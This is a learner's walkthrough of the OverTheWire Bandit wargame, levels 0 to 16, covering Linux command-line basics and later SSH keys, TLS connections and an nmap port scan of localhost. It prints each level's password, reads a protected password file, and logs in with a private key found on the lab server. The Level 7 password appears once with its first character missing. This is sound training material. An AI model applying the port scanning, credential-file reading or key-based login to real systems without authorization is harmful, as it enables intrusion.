# OverTheWire Bandit — Write-ups

My personal write-ups and notes while solving the **OverTheWire Bandit** wargame.

> **Goal:** Learn Linux, command-line usage, file handling, and basic cybersecurity concepts through hands-on challenges.

---

## 📚 Table of Contents

- [Connecting to Bandit](#-connecting-to-bandit)
- [Level 0 → 1](#level-0--1)
- [Level 1 → 2](#level-1--2)
- [Level 2 → 3](#level-2--3)
- [Level 3 → 4](#level-3--4)
- [Progress](#-progress)
- [Skills Practiced](#-skills-practiced)

---

# 🔐 Connecting to Bandit

The Bandit levels are accessed through SSH. To connect to a level, I used the following command:

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
```

The command can be broken down as follows:

- `ssh` — Secure Shell, used to connect to a remote machine.
- `bandit0` — The username for the current Bandit level.
- `bandit.labs.overthewire.org` — The Bandit server.
- `-p 2220` — Specifies port `2220`, which is the port used by the Bandit game.

After completing a level, I used the password obtained from that level to log into the next one.

For example, after obtaining the password for Level 1:

```bash
ssh bandit1@bandit.labs.overthewire.org -p 2220
```

The same process is repeated for the following levels by changing the username.

---

# Level 0 → 1

## 🎯 Objective

Find the password for the next level.

## 🔎 Enumeration

After logging into the Bandit server, I first listed the files in the current directory using:

```bash
ls
```

This displayed the files available in the current directory.

I then used the `cat` command to read the contents of the file:

```bash
cat <filename>
```

The output contained the password required to log into **Level 1**:

```text
6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR
```

## 🔑 Password

```text
6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR
```

## 🧠 What I Learned

- `ls` is used to list files and directories.
- `cat` is used to display the contents of a file.
- `ssh` is used to securely connect to a remote Linux system.
- Basic Linux commands are important when navigating a Linux environment.

---

# Level 1 → 2

## 🎯 Objective

Find the password for the next level.

## 🔎 Enumeration

The password was stored in a file named:

```text
-
```

A normal attempt would be:

```bash
cat -
```

However, `-` has a special meaning in many Linux commands and can represent standard input.

## 💡 Solution

I explicitly specified that the file was located in the current directory:

```bash
cat ./-
```

Here, `./` tells the shell that `-` refers to a file in the current directory.

The command displayed the password required for **Level 2**:

```text
PK8fYLZg2hnHSz83plBL1iEPKdD3QToB
```

## 🔑 Password

```text
PK8fYLZg2hnHSz83plBL1iEPKdD3QToB
```

## 🧠 What I Learned

- `-` can have a special meaning when used with Linux commands.
- `./` can be used to explicitly reference a file in the current directory.
- Special filenames may require a different way of accessing them.
- Linux commands can interpret certain characters specially.

---

# Level 2 → 3

## 🎯 Objective

Find the password for the next level.

## 🔎 Enumeration

The password was stored in a file whose name contained spaces:

```text
--file with spaces--
```

If I tried to access it normally:

```bash
cat --file with spaces--
```

the shell would interpret the spaces as argument separators.

Instead of treating the filename as one argument, it would interpret it as multiple arguments.

## 💡 Solution

I enclosed the filename in double quotes:

```bash
cat "--file with spaces--"
```

The quotation marks tell the shell to treat the entire filename as a single argument.

The command displayed the password required for **Level 3**:

```text
7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME
```

## 🔑 Password

```text
7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME
```

## 🧠 What I Learned

- Spaces are normally used by the shell to separate arguments.
- Filenames containing spaces should be quoted.
- Double quotes allow the shell to treat the entire filename as one argument.
- The shell parses commands before passing arguments to programs.

---

# Level 3 → 4

## 🎯 Objective

Find the password for the next level stored in a hidden file inside the `inhere` directory.

## 🔎 Enumeration

First, I changed into the target directory:

```bash
cd inhere
```

A standard `ls` command did not show the password file because hidden files in Linux start with a dot (`.`).

To list all files, including hidden files, I used:

```bash
ls -a
```

This revealed a hidden file named:

```text
...Hiding-From-You
```

## 💡 Solution

I then read the contents of the hidden file using:

```bash
cat ./"...Hiding-From-You"
```

The command displayed the password required for **Level 4**.

## 🔑 Password

```text
xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq
```

## 🧠 What I Learned

- `cd` is used to change directories in Linux.
- Hidden files in Linux begin with a dot (`.`).
- `ls -a` lists all files, including hidden files.
- `./` can be used to reference a file in the current directory.
- Quoting can help when dealing with filenames containing special characters.

---

# Level 4 → 5

## 🎯 Objective

Find the password for the next level. The password was stored in one of the files inside the `inhere` directory.

## 🔎 Enumeration

I was given a directory named `inhere`, so I first changed into that directory using:

```bash
cd inhere
```

I then listed the files using:

```bash
ls
```

This showed 10 files:

```text
-file00
-file01
-file02
-file03
-file04
-file05
-file06
-file07
-file08
-file09
```

The password was stored in one of these files.

## 🔬 Initial Approach

I first tried reading the first file:

```bash
cat ./"-file00"
```

However, the output appeared to be gibberish rather than readable text.

This suggested that the file might contain binary data instead of normal ASCII text.

## 💡 Solution

Instead of manually checking every file with `cat`, I decided to determine the type of each file using the `file` command:

```bash
file -- *
```

Here, `*` is a wildcard that matches all files in the current directory.

The `--` tells the command that everything after it should be treated as filenames rather than command options. This was important because all the filenames started with `-`.

The command displayed the file type of each file.

After checking the results, I found that:

```text
-file07
```

contained ASCII text while the other files contained different types of data.

I then read the contents of `-file07`:

```bash
cat ./"-file07"
```

This displayed the password for **Level 5**.

## 🔑 Password

```text
6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG
```

## 🧠 What I Learned

- `cd` is used to change directories.
- `ls` is used to list files in a directory.
- `file` can be used to determine the type of data stored in a file.
- `*` is a wildcard that can match multiple files.
- `--` tells a command that the following arguments should be treated as filenames rather than options.
- Files containing binary data may appear as gibberish when displayed using `cat`.
- Instead of manually opening every file, identifying the file type can make the search much more efficient.

---

## 📌 Key Takeaway

When multiple files are present and only one contains readable text, checking their file types first can quickly narrow down the correct file.

The main command I used was:

```bash
file -- *
```

Then I read the ASCII file using:

```bash
cat ./"-file07"
```


# Level 5 → 6

## 🎯 Objective

The password for the next level is stored in a file somewhere under the `inhere` directory.

The file has all of the following properties:

- Human-readable
- Exactly 1033 bytes in size
- Not executable

## 🔎 Enumeration

I first changed into the `inhere` directory:

```bash
cd inhere
```

I then used `ls` to inspect the contents:

```bash
ls
```

There were multiple directories inside `inhere`, so manually checking every directory and file would be inefficient.

## 💡 Solution

Since the challenge gave a specific file size, I used the `find` command to search recursively for regular files that were exactly **1033 bytes** in size:

```bash
find . -type f -size 1033c
```

The command can be broken down as follows:

- `find .` — searches from the current directory recursively.
- `-type f` — searches only for regular files.
- `-size 1033c` — searches for files that are exactly 1033 bytes in size.
- `c` — specifies that the size is measured in bytes.

The command returned the path of the file:

```text
./maybehere07/.file2
```

I then used `cat` to display its contents:

```bash
cat ./maybehere07/.file2
```

This displayed the password for **Level 6**.

## 🔑 Password

```text
pXa26xhMWaC2SvDotA4r9EgZkulOeSBW
```

## 🧠 What I Learned

- `find` can recursively search through directories.
- `-type f` is used to search for regular files.
- `-size 1033c` searches for files that are exactly 1033 bytes.
- A relative path such as `./maybehere07/.file2` can be used to access a file.
- Using the properties provided by a challenge can make searching through many files much faster.

---

## 📌 Key Takeaway

When a challenge gives specific properties such as file size and file type, `find` can be used to narrow down the search instead of manually checking every file.

The main command I used was:

```bash
find . -type f -size 1033c
```

After finding the file, I used:

```bash
cat ./maybehere07/.file2
```


# Level 6 → 7

## 🎯 Objective

The password for the next level is stored **somewhere on the server** and has all of the following properties:

- Owned by user `bandit7`
- Owned by group `bandit6`
- Exactly 33 bytes in size

## 🔎 Initial Enumeration

I first checked the current directory using:

```bash
ls
```

I also tried:

```bash
la
```

However, there were no useful files in the current directory.

Since the challenge stated that the password was stored **somewhere on the server**, I needed to search beyond the current directory.

## 🔍 Searching the Current Directory

I first tried using `find` from the current directory:

```bash
find -type f -size 33c -user bandit7 -group bandit6
```

This did not return any results.

The reason is that `find` was only searching from the current directory, while the target file could be located anywhere on the server.

## 💡 Searching the Entire Server

I then changed the starting location of the search to `/`, which represents the root of the filesystem:

```bash
find / -type f -size 33c -user bandit7 -group bandit6
```

This searched the entire server.

However, the command produced many `Permission denied` errors because the `bandit6` user does not have permission to access certain directories.

The output was difficult to read because of all the permission errors.

## 🛠️ Suppressing Permission Errors

I redirected the error output to `/dev/null`:

```bash
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
```

The command can be broken down as follows:

- `find /` — searches from the root directory, covering the entire filesystem.
- `-type f` — searches only for regular files.
- `-user bandit7` — searches for files owned by the `bandit7` user.
- `-group bandit6` — searches for files owned by the `bandit6` group.
- `-size 33c` — searches for files exactly 33 bytes in size.
- `2>` — redirects standard error.
- `/dev/null` — discards the redirected error messages.

The command returned:

```text
/var/lib/dpkg/info/bandit7.password
```

## 🔑 Retrieving the Password

I used `cat` to read the file:

```bash
cat /var/lib/dpkg/info/bandit7.password
```

This displayed the password for **Level 7**:

```text
Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3
```

## 🧠 What I Learned

- `find` can search the filesystem using multiple conditions.
- `/` represents the root of the Linux filesystem.
- `-user` can search for files owned by a specific user.
- `-group` can search for files owned by a specific group.
- `-size 33c` searches for files exactly 33 bytes in size.
- Some directories cannot be accessed without sufficient permissions.
- `2>/dev/null` can be used to suppress error messages sent to standard error.
- Searching from `/` allows `find` to search the entire filesystem.

---

## 📌 Key Takeaway

When a file could be located anywhere on the server, searching from the root directory is more appropriate than searching only from the current directory.

The final command I used was:

```bash
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
```

After finding the file, I used:

```bash
cat /var/lib/dpkg/info/bandit7.password
```


# Level 7 → 8

## 🎯 Objective

The password for the next level is stored in the file `data.txt` next to the word `millionth`.

## 🔎 Enumeration

I first checked the contents of the current directory using:

```bash
ls
```

I found the file:

```text
data.txt
```

Since the challenge specified that the password was located next to the word `millionth`, I needed to search the file for that specific word.

## 💡 Solution

I used the `grep` command to search for the word `millionth` inside `data.txt`:

```bash
grep "millionth" data.txt
```

The command searched through `data.txt` and returned the line containing the word `millionth` along with the password next to it.

The output contained the password for **Level 8**:

```text
R1ljMayciFxbnUokuQmJFw6QC9VKtub
```

## 🔑 Password

```text
VR1ljMayciFxbnUokuQmJFw6QC9VKtub
```

## 🧠 What I Learned

- `grep` is used to search for text inside files.
- `grep "word" filename` searches for a specific word or pattern in a file.
- Searching for a known keyword is much faster than manually reading a large file.
- Linux command-line tools can be combined with simple search patterns to quickly locate information.

---

## 📌 Key Takeaway

When a file contains a large amount of text and I know a specific word associated with the information I need, `grep` can quickly locate the relevant line.

The main command I used was:

```bash
grep "millionth" data.txt
```

# Level 8 → 9

## 🎯 Objective

The password for the next level is stored in the file `data.txt` and is the only line that occurs exactly once.

## 🔎 Enumeration

I first checked the contents of the current directory:

```bash
ls
```

I found the file:

```text
data.txt
```

The file contained many lines of text, with most of the lines appearing more than once.

Instead of manually checking every line, I needed a way to identify the line that occurred only once.

## 💡 Solution

I used the pipe (`|`) operator together with the `sort` and `uniq` commands:

```bash
sort data.txt | uniq -u
```

The command works in two steps.

### 1. Sort the file

```bash
sort data.txt
```

This sorts all the lines in `data.txt` alphabetically.

Sorting is important because `uniq` only compares adjacent lines. By sorting the file first, identical lines are placed next to each other.

### 2. Find the unique line

The sorted output is passed to `uniq` using the pipe operator:

```bash
|
```

I used:

```bash
uniq -u
```

The `-u` option tells `uniq` to display only lines that occur exactly once.

The complete command was:

```bash
sort data.txt | uniq -u
```

This returned the password for **Level 9**:

```text
EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl
```

## 🔑 Password

```text
EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl
```

## 🧠 What I Learned

- `sort` sorts lines of text.
- `uniq` is used to identify or remove repeated lines.
- `uniq -u` displays only lines that occur exactly once.
- `|` is called the pipe operator.
- The pipe sends the output of one command directly into another command.
- `uniq` works on adjacent duplicate lines, which is why sorting the data first is important.

---

## 📌 Key Takeaway

The important concept in this level was combining multiple Linux commands using a pipe.

The command I used was:

```bash
sort data.txt | uniq -u
```

Here, the output of `sort` becomes the input for `uniq`, allowing me to quickly find the only line that appears once in the file.

# Level 9 → 10

## 🎯 Objective

The password for the next level is stored in the file `data.txt` in one of the few human-readable strings, preceded by several `=` characters.

## 🔎 Enumeration

I first used `cat` to view the contents of `data.txt`:

```bash
cat data.txt
```

The output contained a large amount of non-readable or binary-looking data, making it difficult to identify the password directly.

## 💡 Solution

Since the file contained binary data along with some readable text, I used the `strings` command:

```bash
strings data.txt
```

The `strings` command extracts sequences of printable characters from a file. This made the human-readable portions of `data.txt` much easier to examine.

However, there were still many strings in the output. The challenge specified that the password was preceded by several `=` characters.

Therefore, I used `grep` together with the pipe operator:

```bash
strings data.txt | grep "==="
```

The command returned:

```text
\========== the
\========== password
Y========== is
\========== B0s2khmbT9u0geKuOoVGW3JZKhndE3BG
```

The line containing the password was:

```text
\========== B0s2khmbT9u0geKuOoVGW3JZKhndE3BG
```

Therefore, the password was:

```text
B0s2khmbT9u0geKuOoVGW3JZKhndE3BG
```

## 🔑 Password

```text
B0s2khmbT9u0geKuOoVGW3JZKhndE3BG
```

## 🧠 What I Learned

- `cat` can display the contents of a file, but it is not always useful for binary data.
- `strings` extracts human-readable sequences of characters from binary files.
- `grep` can filter text based on a specific pattern.
- `|` is the pipe operator, which sends the output of one command as input to another command.
- Combining commands can make searching through large amounts of data much easier.

---

## 📌 Key Takeaway

When a file contains mostly non-readable data but the challenge mentions that some human-readable strings are present, `strings` can be used to extract those readable portions.

I then used `grep` to filter the output for strings containing `===`:

```bash
strings data.txt | grep "==="
```

This allowed me to quickly locate the line containing the password.


# Level 10 → 11

## 🎯 Objective

The password for the next level is stored in the file `data.txt`, which contains Base64 encoded data.

## 🔎 Enumeration

I first checked the contents of the current directory:

```bash
ls
```

I found the file:

```text
data.txt
```

I then viewed the contents of the file:

```bash
cat data.txt
```

The contents were not in a normal readable format. The challenge stated that the data was **Base64 encoded**, so I needed to decode it.

## 💡 Solution

I used the `base64` command with the `-d` option:

```bash
base64 -d data.txt
```

Here:

- `base64` is a Linux command used to encode or decode Base64 data.
- `-d` stands for **decode**.
- `data.txt` is the file containing the encoded data.

The command decoded the contents of `data.txt` and gave the following output:

```text
The password is pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro
```

Therefore, the password for **Level 11** was:

```text
pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro
```

## 🔑 Password

```text
pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro
```

## 🧠 What I Learned

- Base64 is an encoding method used to represent data using a set of ASCII characters.
- Base64 is **encoding, not encryption**.
- The `base64` command can be used to decode Base64 encoded data.
- The `-d` option tells the command to decode the input.
- Encoded data can often be identified from the characters it contains and the context provided by the challenge.

---

## 📌 Key Takeaway

When a file contains Base64 encoded data, it can be decoded using:

```bash
base64 -d data.txt
```

The `-d` option stands for **decode**, and the resulting output revealed the password for the next level.

# Level 11 → 12

## 🎯 Objective

The password for the next level is stored in the file `data.txt`, where all lowercase (`a-z`) and uppercase (`A-Z`) letters have been rotated by 13 positions.

This type of substitution is called **ROT13**.

## 🔎 Enumeration

I first checked the contents of the current directory:

```bash
ls
```

I found the file:

```text
data.txt
```

I then viewed the file:

```bash
cat data.txt
```

The contents were not directly readable because the letters had been encoded using ROT13.

## 💡 Solution

To decode the ROT13 text, I used the `tr` command together with the pipe operator:

```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

The command works in two steps.

### 1. Read the file

```bash
cat data.txt
```

This reads the contents of `data.txt`.

### 2. Translate the characters

The output of `cat` is passed to `tr` using the pipe operator:

```bash
|
```

The `tr` command stands for **translate** and replaces characters according to the character sets provided.

I used:

```bash
tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

The first set:

```text
A-Za-z
```

represents all uppercase and lowercase English letters.

The second set:

```text
N-ZA-Mn-za-m
```

represents the letters shifted by 13 positions.

For example:

```text
A → N
B → O
C → P
...
N → A
O → B
P → C
```

Because ROT13 is symmetrical, applying the same transformation again decodes the text.

The command returned:

```text
The password is GROozWPO8QyN0mGrjUkID0WCYkZiQxrN
```

Therefore, the password for **Level 12** was:

```text
GROozWPO8QyN0mGrjUkID0WCYkZiQxrN
```

## 🔑 Password

```text
GROozWPO8QyN0mGrjUkID0WCYkZiQxrN
```

## 🧠 What I Learned

- ROT13 is a substitution cipher that rotates each letter by 13 positions.
- `tr` is a Linux command used to translate or replace characters.
- `A-Za-z` represents uppercase and lowercase English letters.
- `N-ZA-Mn-za-m` represents the ROT13 character mapping.
- The pipe operator `|` sends the output of one command as input to another command.
- ROT13 is symmetrical, meaning the same transformation can be used to encode and decode the text.

---

## 📌 Key Takeaway

When text has been encoded using ROT13, the `tr` command can be used to translate each letter back to its original character.

The command I used was:

```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

This decoded the contents of `data.txt` and revealed the password for the next level.


# Level 12 → 13

## 🎯 Objective

The password for the next level is stored in the file `data.txt`, which is a hexdump of a file that has been repeatedly compressed.

The file uses multiple layers of compression and different archive formats, so I needed to repeatedly identify, rename, decompress, and check the resulting file.

## 📁 Creating a Working Directory

Since I would be modifying and decompressing the file multiple times, I created a temporary working directory using:

```bash
mktemp -d
```

I then copied the original `data.txt` file into the temporary directory:

```bash
cp data.txt /tmp/<temporary-directory>/
```

I changed into the temporary directory:

```bash
cd /tmp/<temporary-directory>
```

This allowed me to work on a copy of the file without modifying the original.

---

## 🔄 Step 1 — Convert the Hexdump

The `data.txt` file was a hexdump rather than the actual binary file.

I used `xxd` with the `-r` option to reverse the hexdump and recreate the binary file:

```bash
xxd -r data.txt data.bin
```

Here:

- `xxd` is used to create and manipulate hexadecimal dumps.
- `-r` means **reverse**, converting the hexdump back into binary data.
- `data.txt` is the input hexdump.
- `data.bin` is the resulting binary file.

---

## 🔍 Step 2 — Identify the File Type

I then used the `file` command to determine what type of data was stored in the binary file:

```bash
file data.bin
```

The output showed the compression or archive format of the file.

---

## 🗜️ Step 3 — Decompress the File

The file was repeatedly compressed using different compression formats.

Whenever I identified the file type using `file`, I renamed the file with the appropriate extension and then decompressed or extracted it.

### Gzip

If the file was identified as Gzip, I renamed it:

```bash
mv data.bin data.gz
```

Then decompressed it:

```bash
gzip -d data.gz
```

I then checked the resulting file again:

```bash
file data
```

### Bzip2

If the file was identified as Bzip2, I renamed it:

```bash
mv data data.bz2
```

Then decompressed it using:

```bash
bzip2 -d data.bz2
```

I checked the resulting file again:

```bash
file data
```

### Tar Archive

If the file was identified as a tar archive, I renamed it:

```bash
mv data data.tar
```

Then extracted it using:

```bash
tar -xf data.tar
```

I then checked the extracted file:

```bash
file data
```

---

## 🔁 Step 4 — Repeat the Process

The main challenge was that the file had been compressed multiple times.

After every decompression or extraction, I used:

```bash
file data
```

to determine the format of the resulting file.

I then performed the appropriate operation based on the file type.

The general process was:

```text
Hexdump
   ↓
xxd -r
   ↓
Identify file type
   ↓
Rename file
   ↓
Decompress / Extract
   ↓
Identify file type again
   ↓
Repeat
   ↓
ASCII text
```

I continued this process until the final file was identified as ASCII text.

The final output was:

```text
The password is qQYQiHOBPR8zR61qxYqX45quvihF2uzk
```

## 🔑 Password

```text
qQYQiHOBPR8zR61qxYqX45quvihF2uzk
```

## 🧠 What I Learned

- `mktemp -d` creates a temporary directory with a randomly generated name.
- `cp` is used to copy files.
- `mv` can be used to rename files.
- `xxd -r` converts a hexdump back into binary data.
- `file` can identify the type of a file.
- `gzip -d` decompresses Gzip files.
- `bzip2 -d` decompresses Bzip2 files.
- `tar -xf` extracts files from a tar archive.
- A file can have multiple layers of compression.
- The `file` command is useful for deciding which tool to use next.

---

## 📌 Key Takeaway

This level taught me how to work with files that have been repeatedly compressed using different formats.

Instead of guessing the compression format, I used:

```bash
file data
```

after every step to identify the current format.

The overall process was:

```bash
xxd -r data.txt data.bin
file data.bin
```

Then I repeatedly used the appropriate commands such as:

```bash
mv data.bin data.gz
gzip -d data.gz
```

```bash
mv data data.bz2
bzip2 -d data.bz2
```

```bash
mv data data.tar
tar -xf data.tar
```

until I reached the final ASCII text containing the password.

# Level 13 → 14

## 🎯 Objective

The password for the next level is stored in:

```text
/etc/bandit_pass/bandit14
```

It can only be read by the `bandit14` user.

Instead of directly giving the password, this level provides a **private SSH key** that can be used to log into the `bandit14` account.

## 🔎 Enumeration

I first listed the files in my home directory:

```bash
ls
```

I found an SSH private key along with a hint file.

The private key could be used to authenticate as `bandit14`.

## 🔐 Using the SSH Key

I first tried to connect using the private key:

```bash
ssh -4 -i temp_key bandit14@bandit.labs.overthewire.org -p 2220
```

However, SSH returned the following error:

```text
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'temp_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "temp_key": bad permissions
```

The error message explained that the permissions of the private key were too open.

The file had permissions:

```text
0664
```

This meant that users other than the owner could also access the file.

For security reasons, SSH requires private keys to have sufficiently restrictive permissions.

## 🛠️ Changing File Permissions

I changed the permissions of the private key using:

```bash
chmod 600 temp_key
```

The `chmod` command is used to change file permissions.

The permission `600` means:

- Owner → Read and write
- Group → No permissions
- Others → No permissions

Therefore, only the owner can access the private key.

## 🔑 Connecting Using the Private Key

After changing the permissions, I ran the SSH command again:

```bash
ssh -4 -i temp_key bandit14@bandit.labs.overthewire.org -p 2220
```

This time, the private key was accepted and I successfully logged into the `bandit14` account.

## 🔎 Retrieving the Password

The challenge stated that the password was located at:

```text
/etc/bandit_pass/bandit14
```

I used `cat` to read the file:

```bash
cat /etc/bandit_pass/bandit14
```

This displayed the password for **Level 14**:

```text
aaWecNkG4FhxJQxz07uiwzVP6bJiYS65
```

## 🔑 Password

```text
aaWecNkG4FhxJQxz07uiwzVP6bJiYS65
```

## 🧠 What I Learned

- SSH can authenticate users using private keys instead of passwords.
- The `-i` option specifies the private key file to use.
- SSH requires private keys to have restrictive permissions.
- `chmod` is used to change file permissions.
- `chmod 600` gives the owner read and write permissions while denying access to the group and other users.
- Error messages can provide useful information about why a command failed.
- The `-4` option tells SSH to use IPv4.
- Sensitive files such as private SSH keys should not be accessible to other users.

---

## 📌 Key Takeaway

The main challenge in this level was understanding the SSH private-key permission error.

My first attempt failed because the private key had permissions of `0664`:

```bash
ssh -4 -i temp_key bandit14@bandit.labs.overthewire.org -p 2220
```

I fixed the permissions with:

```bash
chmod 600 temp_key
```

Then I connected successfully using:

```bash
ssh -4 -i temp_key bandit14@bandit.labs.overthewire.org -p 2220
```

Finally, I retrieved the password using:

```bash
cat /etc/bandit_pass/bandit14
```
# Level 14 → 15

## 🎯 Objective

The password for the next level can be retrieved by submitting the password of the current level to **port 30000 on localhost**.

## 🔎 Understanding the Challenge

The challenge requires me to send the current level's password to a service running locally on port `30000`.

The term `localhost` refers to the current machine itself. It is commonly associated with the IP address:

```text
127.0.0.1
```

The number `30000` is the network port where the service is listening.

Therefore, I needed to establish a connection to:

```text
localhost:30000
```

and send the current password.

## 💡 Solution

I used the `telnet` command:

```bash
telnet localhost 30000
```

The command connected to the service running on port `30000`:

```text
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
```

I then entered the password from the previous level:

```text
aaWecNkG4FhxJQxz07uiwzVP6bJiYS65
```

The server responded:

```text
Correct!
pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
```

The returned value was the password for **Level 15**.

The connection was then closed by the server:

```text
Connection closed by foreign host.
```

## 🔑 Password

```text
pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
```

## 🧠 What I Learned

- `localhost` refers to the current machine.
- `127.0.0.1` is the loopback IP address commonly used for localhost.
- A **port** identifies a specific network service running on a machine.
- `30000` was the port where the required service was listening.
- `telnet` is a command-line protocol/tool that can establish a basic TCP connection to a specified host and port.
- Telnet does not provide encryption, so it should not be used for transmitting sensitive information over untrusted networks.
- Network services can accept input and return responses through TCP connections.
- The server's response confirmed whether the submitted password was correct.

---

## 📌 Key Takeaway

This level introduced basic interaction with a network service running on the local machine.

I connected to port `30000` using:

```bash
telnet localhost 30000
```

I then submitted the current password:

```text
aaWecNkG4FhxJQxz07uiwzVP6bJiYS65
```

The server responded with:

```text
Correct!
pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
```

The returned string was the password for the next level.

# Level 15 → 16

## 🎯 Objective

The password for the next level can be retrieved by submitting the password of the current level to **port 30001 on localhost using SSL/TLS encryption**.

Unlike the previous level, a normal unencrypted connection using Telnet is not sufficient because the service requires an encrypted TLS connection.

## 🔎 Understanding the Challenge

The previous level required connecting to a service using:

```text
localhost:30000
```

However, this level requires connecting to:

```text
localhost:30001
```

using **SSL/TLS encryption**.

TLS encrypts the communication between the client and the server.

To create this encrypted connection, I used the OpenSSL command-line tool.

## 💡 Solution

I used the following command:

```bash
echo "pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7" | openssl s_client -connect localhost:30001 -ign_eof
```

This command performs several operations.

### 1. `echo`

```bash
echo "pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7"
```

The `echo` command prints the password from the current level.

The password is:

```text
pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
```

### 2. Pipe Operator `|`

```bash
|
```

The pipe operator sends the output of the command on the left as input to the command on the right.

In this case, it sends the password produced by `echo` directly to `openssl s_client`.

The flow is:

```text
echo
  ↓
Current Level Password
  ↓
Pipe |
  ↓
openssl s_client
  ↓
Encrypted TLS Connection
  ↓
Server
```

### 3. `openssl s_client`

```bash
openssl s_client
```

`openssl` is a command-line tool for working with cryptographic protocols and certificates.

The `s_client` command acts as an SSL/TLS client and allows me to establish an encrypted connection to a server.

### 4. `-connect localhost:30001`

```bash
-connect localhost:30001
```

This specifies the server and port to connect to.

- `localhost` refers to the current machine.
- `30001` is the port where the TLS-enabled service is running.

### 5. `-ign_eof`

```bash
-ign_eof
```

Normally, when `echo` finishes sending the password, the pipe reaches **EOF (End Of File)**.

The `-ign_eof` option tells `openssl s_client` to ignore the immediate EOF from standard input and keep the connection open long enough to receive the server's response.

This is useful because the server may send its response after the password has been transmitted.

## 🔐 TLS Connection

The command successfully established an encrypted TLS connection:

```text
Connecting to 127.0.0.1
CONNECTED
```

OpenSSL then displayed information about the server's TLS certificate and connection.

One message shown was:

```text
verify error:num=18:self-signed certificate
```

This occurred because the server uses a **self-signed certificate**.

A self-signed certificate is not signed by a publicly trusted Certificate Authority, so OpenSSL cannot verify it in the normal way.

For this Bandit challenge, the important part was successfully establishing the encrypted connection to the local service.

The connection used:

```text
TLSv1.3
```

## 🔑 Submitting the Password

The current level's password was automatically sent through the encrypted TLS connection:

```text
pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
```

The server responded:

```text
Correct!
kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V
```

Therefore, the password for **Level 16** was:

```text
kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V
```

## 🔑 Password

```text
kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V
```

## 🧠 What I Learned

- SSL/TLS is used to encrypt communication between a client and a server.
- `openssl s_client` can be used to establish an SSL/TLS connection from the command line.
- `-connect` specifies the host and port of the server.
- The pipe operator `|` sends the output of one command as input to another command.
- `echo` can be used to automatically provide input to another command.
- `-ign_eof` prevents `openssl s_client` from immediately closing the connection when standard input reaches EOF.
- A self-signed certificate is not signed by a publicly trusted Certificate Authority.
- TLS certificates are used as part of establishing secure connections.

---

## 📌 Key Takeaway

This level was similar to the previous networking challenge, but instead of using an unencrypted Telnet connection, the service required SSL/TLS encryption.

The command I used was:

```bash
echo "pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7" | openssl s_client -connect localhost:30001 -ign_eof
```

The password was sent through an encrypted TLS connection, and the server responded with:

```text
Correct!
kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V
```

This introduced me to using OpenSSL and interacting with services that require encrypted network communication.

# Level 16 → 17

## 🎯 Objective

The credentials for the next level can be retrieved by submitting the password of the current level to a service running on **localhost**.

The service is listening on a port in the range:

```text
31000 - 32000
```

The challenge required me to:

1. Find which ports have a server listening on them.
2. Identify which of those services use SSL/TLS.
3. Submit the current password to the SSL/TLS services.
4. Find the server that provides the credentials for the next level.

Some of the other servers simply echo back whatever data is sent to them.

## 🔎 Scanning for Open Ports

I used Nmap to scan the specified range of ports:

```bash
nmap -sV -p 31000-32000 localhost
```

### Command Breakdown

```bash
nmap
```

Nmap is a network scanning tool that can be used to discover hosts, open ports, and services.

```bash
-sV
```

This enables **service version detection**. Nmap attempts to determine what service is running on each open port.

```bash
-p 31000-32000
```

This tells Nmap to scan all ports from `31000` to `32000`.

```bash
localhost
```

This scans the current machine.

## 📊 Scan Results

The scan returned the following open ports:

```text
PORT      STATE SERVICE     VERSION
31046/tcp open  echo
31518/tcp open  ssl/echo
31691/tcp open  echo
31790/tcp open  ssl/unknown
31960/tcp open  echo
```

Most of the services were identified as regular `echo` services.

However, two ports were identified as using SSL/TLS:

```text
31518/tcp
31790/tcp
```

Therefore, these were the two ports I needed to investigate further.

---

## 🔐 Testing Port 31518

I first submitted the current password to port `31518` using `openssl s_client`:

```bash
echo "kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V" | openssl s_client -connect localhost:31518 -ign_eof
```

The command works as follows:

```text
echo
  ↓
Current password
  ↓
Pipe operator |
  ↓
openssl s_client
  ↓
Encrypted TLS connection
  ↓
localhost:31518
```

However, this service simply returned the same string that I sent.

This indicated that the service was an **SSL/TLS echo service** and was not the service that provided the next credentials.

---

## 🔐 Testing Port 31790

I then tested the second SSL/TLS port:

```bash
echo "kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V" | openssl s_client -connect localhost:31790 -ign_eof
```

This time, the service responded with an **OpenSSH private key** instead of simply echoing the password.

The private key is used as the credential for the next level.

---

